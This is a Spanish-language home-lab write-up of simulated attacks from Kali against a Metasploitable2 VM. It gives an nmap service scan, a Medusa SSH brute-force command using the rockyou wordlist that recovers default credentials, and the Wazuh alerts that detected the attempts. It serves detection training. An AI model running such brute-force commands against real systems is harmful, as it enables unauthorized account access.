# 03 — Ataques simulados desde Kali

## Ataque 1 — Reconocimiento con Nmap

**Herramienta:** Nmap 7.98  
**Comando:** sudo nmap -sS -A 10.0.2.5  
**Objetivo:** Metasploitable2 (10.0.2.5)  

### Servicios descubiertos
| Puerto | Servicio | Versión |
|---|---|---|
| 21/tcp | FTP | vsftpd 2.3.4 (backdoor conocida) |
| 22/tcp | SSH | OpenSSH 4.7p1 |
| 23/tcp | Telnet | Linux telnetd |
| 80/tcp | HTTP | Apache 2.2.8 |
| 3306/tcp | MySQL | 5.0.51a |
| 5900/tcp | VNC | Protocol 3.3 |
| 6667/tcp | IRC | UnrealIRCd |

**Resultado nmap — parte 1:**

![Nmap 1](https://github.com/user-attachments/assets/51c55463-1456-4f8a-b697-13eb9850c16f)

**Resultado nmap — parte 2:**

![Nmap 2](https://github.com/user-attachments/assets/dcf82370-e77f-4cd2-9fe0-f9d5c9bba130)

---

## Ataque 2 — Fuerza bruta SSH con Medusa

**Herramienta:** Medusa v2.3  
**Comando:** medusa -h 10.0.2.5 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -v 4  
**Objetivo:** Puerto 22 (SSH) de Metasploitable2  
**Resultado:**  ACCOUNT FOUND — msfadmin:msfadmin  

**Ataque de fuerza bruta en curso:**

![Medusa](https://github.com/user-attachments/assets/27316abe-f17a-437a-b8c5-9b0cb31da684)

**Credenciales encontradas:**

![Medusa Result](https://github.com/user-attachments/assets/34946721-86ea-4a1a-bede-a679189f01d3)

---

## Detección en Wazuh

| Rule ID | Descripción | Nivel |
|---|---|---|
| 5503 | PAM: User login failed | 5 |
| 5557 | unix_chkpwd: Password check failed | 5 |

**Eventos detectados en tiempo real:**

![Wazuh Events](https://github.com/user-attachments/assets/a0471112-e37c-4cf4-a366-1a3beda91257)
